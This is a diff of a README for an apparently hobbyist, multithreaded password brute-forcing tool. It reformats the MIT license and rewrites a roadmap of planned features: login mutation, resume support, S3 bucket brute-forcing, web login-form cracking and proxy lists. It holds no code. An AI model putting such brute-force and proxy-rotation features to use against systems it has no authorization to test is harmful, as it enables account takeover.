-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 
-THE SOFTWARE IS PROVIDED "AS IS," WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM,
-OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE THEREOF.
 ```
 
-# About tool improvements
+#About improving the tool
 
-This tool is truly a great thing. I plan to introduce many new flags and make it on par with giants like Hydra. At a minimum, we plan to add the --mutate flag to specify a target file containing multiple different strings for mutating logins and passwords. I think it will be a very useful flag. I'd also like to add the --resume flag so that, like in Hydra, you could pause and resume from a specific point after stopping. Another useful feature, I think, would be the introduction of brute-force mode for S3 buckets. I think this feature is really cool, and I only noticed it in the GObuster tool. I think it's truly a cool feature. Accordingly, since we're talking about web testing, it would be worth adding brute-force authentication for web pages like login.php. This would take the tool to the next level and allow it to be turned into something like WFUZZ or something similar. I'm also considering adding the --proxy-list flag, where you can specify a column of proxies for testing. Therefore, brute-forcing web forms will allow you to add HTTP proxies. Honestly, a tool like this could be developed almost endlessly. You could add 200 new flags, but then the usefulness of those flags becomes questionable. I think my latest addition suggestions are truly necessary and useful. I hope at least one person will be able to use this tool. It does, however, brute-force passwords and usernames quite quickly thanks to its multithreading. That's what saves it. You can run a tool like this on powerful computers and open multiple threads for maximum performance. Please, if you're a casual GitHub user, give this tool a try. I assure you, you won't regret it. I know the code is still pretty raw as of 2026. There are a lot of bugs, but I'm trying to fix them. Right now, you can safely use most of the parameters; they all work, though some are still buggy. And please, find me a single brute-forcer online that can provide such a flexible set of parameters for security testing.
+
+
+This tool is truly great. I plan to add a lot of new flags to put it on par with giants like Hydra. At a minimum, we plan to implement the --mutate flag to specify a target file containing various lines for changing logins and passwords. I think this will be very useful. I'd also like to add a --resume flag so that, like Hydra, you can pause and resume from a certain point after stopping.
+Another useful feature, in my opinion, is the introduction of a search mode for S3 storages. I've only seen this in the Gobuster tool and it's a really cool feature. Accordingly, since we are talking about web testing, it would be worth adding brute force authentication for web pages (for example, login.php). This would take the tool to the next level and allow it to become similar to Wfuzz or similar solutions. I'm also considering adding a --proxy-list flag to allow me to specify a list of proxies to test. Thus, when trying to crack passwords in web forms, you can use an HTTP proxy.
+To be honest, such a tool can be developed almost endlessly. You can add 200 new flags, but then their usefulness becomes questionable. I believe that my last suggestions are truly necessary. I hope this tool will be useful to someone. It tries passwords and usernames quite quickly thanks to multi-threading - this is its advantage. It can be run on powerful computers by opening multiple threads for maximum performance.
+Please, if you are a GitHub user, try this tool. I assure you, you won't regret it. I know the code is still pretty crude (as of 2026) and has a lot of bugs, but I'm trying to fix them. Most options are now safe to use: they all work, although some are still buggy. Try to find at least one online password cracking tool that provides such a flexible set of parameters for security testing. It would also be nice to add support for more protocols. Ideally, the number of testing options should reach 30–50.
